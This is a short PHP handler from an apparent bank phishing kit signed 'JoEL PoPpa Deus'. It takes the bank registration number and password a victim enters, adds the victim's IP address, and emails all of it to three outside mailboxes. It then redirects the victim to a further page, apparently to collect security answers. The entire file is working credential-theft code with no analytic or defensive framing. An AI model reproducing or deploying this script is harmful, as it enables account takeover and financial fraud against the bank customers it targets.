<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Acount details-----------------------\n";
$message .= "Customer Registration Number: ".$_POST['joelobaba11']."\n";
$message .= "Password: ".$_POST['joelobaba111']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------By JoEL PoPpa Deus~~---------------------\n";
$recipient = "jbloginbox07@gmail.com,jblogindesign07@hotmail.com,joel.osazie@mail.ru";
$subject = "AZZZZZ Bank";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "email details-Version: 1.0\n";
	 mail("", "jOEl", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: jsessionidquestion.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>